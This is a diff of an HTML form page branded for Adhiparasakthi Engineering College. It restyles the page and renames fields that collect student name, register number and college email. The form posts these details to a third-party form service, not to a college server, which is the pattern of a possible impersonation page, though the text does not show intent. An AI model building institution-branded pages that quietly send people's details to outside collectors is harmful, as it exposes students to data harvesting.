@@ -9,23 +9,26 @@
 body{
     margin:0;
     font-family:Arial,sans-serif;
-    background:#f2f2f2;
+    background:#eef2f7;
     display:flex;
     justify-content:center;
     align-items:center;
     height:100vh;
 }
 .container{
-    width:360px;
+    width:380px;
     background:#fff;
     padding:30px;
     border-radius:10px;
-    box-shadow:0 0 10px rgba(0,0,0,.2);
+    box-shadow:0 0 15px rgba(0,0,0,.15);
     text-align:center;
 }
 .logo{
     width:100px;
     margin-bottom:15px;
+}
+h2{
+    color:#003366;
 }
 input{
     width:100%;
@@ -38,15 +41,15 @@ input{
 button{
     width:100%;
     padding:12px;
+    background:#0056b3;
+    color:#fff;
     border:none;
     border-radius:5px;
-    background:#0066cc;
-    color:#fff;
-    font-size:16px;
     cursor:pointer;
+    font-size:16px;
 }
 button:hover{
-    background:#004c99;
+    background:#003d80;
 }
 </style>
 </head>
@@ -54,15 +57,15 @@ button:hover{
 
 <div class="container">
 
-<img src="logo.png" class="logo" alt="College Logo">
+<img src="logo.png" class="logo" alt="Adhiparasakthi Engineering College Logo">
 
 <h2>Adhiparasakthi Engineering College</h2>
 
 <form action="https://usebasin.com/f/3084131fff4d" method="POST">
 
-<input type="text" name="name" placeholder="Student Name" required>
+<input type="text" name="student_name" placeholder="Student Name" required>
 
-<input type="text" name="student_id" placeholder="Student ID" required>
+<input type="text" name="register_number" placeholder="Register Number" required>
 
 <input type="email" name="email" placeholder="College Email" required>
 
